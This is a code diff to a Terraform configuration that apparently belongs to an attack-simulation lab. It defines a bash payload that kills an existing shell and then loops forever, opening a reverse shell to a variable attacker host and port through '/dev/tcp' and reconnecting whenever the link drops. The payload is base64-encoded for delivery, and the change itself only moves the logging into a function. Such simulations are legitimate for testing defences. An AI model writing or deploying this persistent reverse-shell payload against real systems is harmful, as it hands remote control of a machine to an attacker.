@@ -3,19 +3,24 @@ locals {
     host_port = var.host_port
 
     payload = <<-EOT
-    truncate -s 0 /tmp/attacker_exec_reverseshell_target.log
-    echo "Attacker Host: ${local.host_ip}:${local.host_port}" > /tmp/attacker_exec_reverseshell_target.log
+    LOGFILE=/tmp/attacker_exec_reverseshell_target.log
+    function log {
+        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
+        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
+    }
+    truncate -s 0 $LOGFILE
+    log "attacker Host: ${local.host_ip}:${local.host_port}"
     kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
-    echo "Running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'" >> /tmp/attacker_exec_reverseshell_target.log
+    log "running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
     while true; do
-        echo "reconnecting: ${local.host_ip}:${local.host_port}" >> /tmp/attacker_exec_reverseshell_target.log;
+        log "reconnecting: ${local.host_ip}:${local.host_port}"
         while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
-            echo "reconnecting: ${local.host_ip}:${local.host_port}" >> /tmp/attacker_exec_reverseshell_target.log;
+            log "reconnecting: ${local.host_ip}:${local.host_port}";
             sleep 10;
         done;
-        echo "disconnected - wait retry..." >> /tmp/attacker_exec_reverseshell_target.log;
+        log "disconnected - wait retry...";
         sleep 60;
-        echo "starting retry..." >> /tmp/attacker_exec_reverseshell_target.log;
+        log "starting retry...";
     done
     EOT
     base64_payload = base64encode(local.payload)
